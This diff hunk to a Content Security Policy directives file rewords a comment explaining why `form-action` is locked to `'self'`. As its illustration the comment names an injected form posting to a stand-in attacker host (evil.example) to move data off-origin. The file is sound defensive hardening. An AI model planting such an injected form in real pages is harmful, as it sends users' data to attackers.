@@ -75,7 +75,7 @@ export const CSP_DIRECTIVES: ReadonlyArray<readonly [name: string, value: string
   // `form-action` does not fall back to `default-src`, so omitting it leaves form submission
   // unrestricted even though everything else is locked to `'self'`. With inline script already
   // forbidden, an injected `<form action="https://evil.example">` (or a `formaction` on a submit
-  // button) would be the one remaining way to push data off-origin. Nothing in the app submits a
+  // button) would be a remaining way to push data off-origin. Nothing in the app submits a
   // form anywhere: every form is handled in JavaScript, and the Google Drive consent step is a
   // top-level navigation rather than a form post, so `'self'` costs nothing (issue #517).
   ['form-action', "'self'"],
